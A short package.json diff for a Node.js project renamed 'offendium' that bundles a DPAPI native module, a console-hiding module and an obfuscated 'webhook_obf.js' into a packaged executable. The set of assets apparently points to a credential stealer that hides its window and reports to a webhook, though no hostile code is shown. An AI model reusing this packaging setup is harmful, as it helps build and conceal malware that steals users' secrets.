@@ -19,7 +19,7 @@
     "zip-lib": "^0.7.3"
   },
   "nodeVersion": "system",
-  "name": "offend",
+  "name": "offendium",
   "version": "6.9.6",
   "description": "",
   "main": "./index.js",
@@ -27,9 +27,8 @@
   "pkg": {
     "assets": [
       "./node_modules/boukiapi/build/node-dpapi.node",
-      "./node_modules/boukiapi",
-      "./node_modules/sqlite3",
       "./node_modules/node-hide-console-window/index.js",
+      "./node_modules",
       "./webhook_obf.js"
     ]
   },
